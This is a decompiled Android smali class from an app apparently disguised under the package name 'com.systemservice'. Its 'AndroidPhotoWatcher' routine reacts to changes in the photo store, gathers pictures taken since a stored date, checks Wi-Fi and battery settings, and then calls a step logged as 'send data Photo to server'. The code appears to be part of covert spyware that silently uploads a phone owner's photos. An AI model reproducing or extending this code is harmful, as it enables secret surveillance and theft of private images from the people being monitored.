.class Lcom/systemservice/a/c/g/b;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/g/c;->onChange(Z)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/a/c/g/c;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/g/c;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    const-string v0, "AndroidPhotoWatcher"

    :try_start_0
    iget-object v1, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v1, v1, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v1}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v1

    const-string v2, "sleep: 8000"

    invoke-virtual {v1, v2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-wide/16 v1, 0x1f40

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v2, v2, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v2}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, ""

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    :goto_0
    iget-object v1, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v2, v1, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    iget-object v3, v1, Lcom/systemservice/a/c/g/c;->a:Landroid/content/Context;

    iget-object v1, v1, Lcom/systemservice/a/c/g/c;->b:Landroid/net/Uri;

    invoke-static {v2, v3, v1}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;Landroid/content/Context;Landroid/net/Uri;)Z

    move-result v1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v1, v1, Lcom/systemservice/a/c/g/c;->c:Lcom/systemservice/a/b/a;

    invoke-virtual {v1}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v1

    iget-object v2, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v2, v2, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v2}, Lcom/systemservice/a/c/g/d;->b(Lcom/systemservice/a/c/g/d;)Landroid/content/SharedPreferences;

    move-result-object v2

    const-wide/16 v3, 0x0

    const-string v5, "last_photo_date"

    invoke-interface {v2, v5, v3, v4}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v2

    new-instance v4, Ljava/util/Date;

    const-wide/16 v5, 0x1

    add-long/2addr v2, v5

    const-wide/16 v5, 0x3e8

    mul-long v2, v2, v5

    invoke-direct {v4, v2, v3}, Ljava/util/Date;-><init>(J)V

    iget-object v2, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v2, v2, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v2}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Get picture from date = "

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "get picture from date = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v3, "ts_photo"

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v5, v2, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    iget-object v2, v2, Lcom/systemservice/a/c/g/c;->c:Lcom/systemservice/a/b/a;

    invoke-virtual {v2}, Lcom/systemservice/a/b/a;->a()Landroid/content/Context;

    move-result-object v2

    const/4 v6, 0x0

    invoke-static {v5, v2, v4, v6}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;Landroid/content/Context;Ljava/util/Date;Ljava/util/Date;)V

    iget-object v2, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v2, v2, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    iget-object v2, v2, Lcom/systemservice/a/d/g;->b:Lcom/systemservice/a/h/b;

    check-cast v2, Lcom/systemservice/a/h/l;

    const/4 v4, 0x0

    const-string v5, "sending_photo"

    invoke-static {v1, v5, v4}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "is_sending_photo = "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v3, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    if-nez v5, :cond_2

    iget-object v5, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v5, v5, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v5}, Lcom/systemservice/a/c/g/d;->b(Lcom/systemservice/a/c/g/d;)Landroid/content/SharedPreferences;

    move-result-object v5

    const-string v6, "media_data_transfered_by_wifi_only"

    invoke-interface {v5, v6, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    const-string v6, "save_battery"

    if-eqz v5, :cond_0

    iget-object v5, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v5, v5, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v5}, Lcom/systemservice/a/c/g/d;->b(Lcom/systemservice/a/c/g/d;)Landroid/content/SharedPreferences;

    move-result-object v5

    invoke-interface {v5, v6, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v5

    if-nez v5, :cond_0

    invoke-static {v1}, Lcom/systemservice/a/a/h;->c(Landroid/content/Context;)Z

    move-result v5

    if-nez v5, :cond_0

    const-string v1, "WiFi ONLY = false"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v0, v0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v0}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v0

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    return-void

    :cond_0
    iget-object v0, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v0, v0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v0}, Lcom/systemservice/a/c/g/d;->b(Lcom/systemservice/a/c/g/d;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0, v6, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    const-string v4, "send data Photo to server"

    if-eqz v0, :cond_1

    invoke-static {v1}, Lcom/systemservice/a/a/h;->b(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v0, v0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v0}, Lcom/systemservice/a/c/g/d;->b(Lcom/systemservice/a/c/g/d;)Landroid/content/SharedPreferences;

    move-result-object v0

    const/4 v5, 0x1

    const-string v6, "battery"

    invoke-interface {v0, v6, v5}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_2

    :cond_1
    iget-object v0, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v0, v0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v0}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;)Lorg/apache/log4j/Logger;

    move-result-object v0

    invoke-virtual {v0, v4}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v0, p0, Lcom/systemservice/a/c/g/b;->a:Lcom/systemservice/a/c/g/c;

    iget-object v0, v0, Lcom/systemservice/a/c/g/c;->d:Lcom/systemservice/a/c/g/d;

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/c/g/d;->a(Lcom/systemservice/a/c/g/d;Landroid/content/Context;Lcom/systemservice/a/h/l;)V

    :cond_2
    return-void
.end method
